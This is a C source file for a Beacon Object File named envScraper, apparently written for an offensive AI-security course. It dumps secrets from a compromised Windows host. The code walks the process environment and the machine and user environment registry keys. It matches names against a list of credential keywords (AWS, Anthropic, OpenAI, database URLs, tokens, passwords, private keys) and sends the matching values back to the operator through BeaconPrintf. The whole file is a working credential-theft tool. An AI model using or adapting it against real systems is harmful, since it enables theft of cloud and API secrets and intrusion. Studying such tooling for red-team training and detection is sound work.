/*
 * envScraper.c — environment-block + registry env secret dump (OSAI T1).
 * Course: M9.1.1 (/proc/self/environ AWS creds, SAGEMAKER_ENDPOINT,
 *         BACKEND_ROLE_ARN), M3.2.1, M7.2.1.  ATLAS AML.T0024.
 * Replaces `cmd /c set`, `reg query`. In-process; own env + HKLM/HKCU env.
 *
 * args: int scanRegistry(0/1)
 */
#include "aibof.h"

static int interesting(const char* k) {
  static const char* K[] = {
    "AWS_","ANTHROPIC_","OPENAI_","SAGEMAKER_","BACKEND_","SLACK_",
    "DYNAMODB_","GOOGLE_","GEMINI_","AZURE_","COHERE_","MISTRAL_",
    "HUGGINGFACE","HF_","PINECONE","WEAVIATE","QDRANT","MILVUS",
    "DATABASE_URL","REDIS_","MONGO","PG_","POSTGRES",
    "API_KEY","API_TOKEN","ACCESS_KEY","SECRET_KEY","SECRET_ACCESS",
    "SESSION_TOKEN","CONN_STRING","CONNECTION_STRING","JWT_","TOKEN",
    "PASSWORD","PASSWD","PRIVATE_KEY", NULL
  };
  char up[256]; int i=0;
  for (; k[i] && i<255; i++) up[i] = (k[i]>='a'&&k[i]<='z') ? k[i]-32 : k[i];
  up[i]=0;
  for (int j=0; K[j]; j++) if (xstrstr(up, K[j])) return 1;
  return 0;
}

static void scan_own_env(void) {
  char* env = (char*)KERNEL32$GetEnvironmentStrings();
  if (!env) return;
  char* p = env;
  while (*p) {
    int len = (int)xlen(p);
    char* eq = xstrstr(p, "=");
    if (eq && eq != p) {
      /* temp key copy to test interesting() */
      char k[256]; int kl = eq - p; if (kl > 255) kl = 255;
      xmemcpy(k, p, kl); k[kl] = 0;
      if (interesting(k))
        BeaconPrintf(CALLBACK_OUTPUT, "[env] %s\n", p);
    }
    p += len + 1;
  }
  KERNEL32$FreeEnvironmentStringsA(env);
}

static void scan_reg(HKEY root, const char* sub) {
  HKEY hk;
  if (ADVAPI32$RegOpenKeyExA(root, sub, 0, KEY_READ, &hk) != ERROR_SUCCESS) return;
  char name[256]; char val[4096];
  for (DWORD i = 0; ; i++) {
    DWORD nl = 256, vl = 4096; DWORD type = 0;
    LONG r = ADVAPI32$RegEnumValueA(hk, i, name, &nl, NULL, &type, (LPBYTE)val, &vl);
    if (r == ERROR_NO_MORE_ITEMS) break;
    if (r != ERROR_SUCCESS) break;
    val[vl < 4096 ? vl : 0] = 0;
    if (interesting(name))
      BeaconPrintf(CALLBACK_OUTPUT, "[reg] %s = %s\n", name, val);
  }
  ADVAPI32$RegCloseKey(hk);
}

void go(char* args, int alen) {
  datap p; BeaconDataParse(&p, args, alen);
  int doReg = BeaconDataInt(&p);
  BeaconPrintf(CALLBACK_OUTPUT, "[*] envScraper reg=%d\n", doReg);
  scan_own_env();
  if (doReg) {
    scan_reg(HKEY_LOCAL_MACHINE,
      "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment");
    scan_reg(HKEY_CURRENT_USER, "Environment");
  }
  BeaconPrintf(CALLBACK_OUTPUT, "[*] envScraper done\n");
}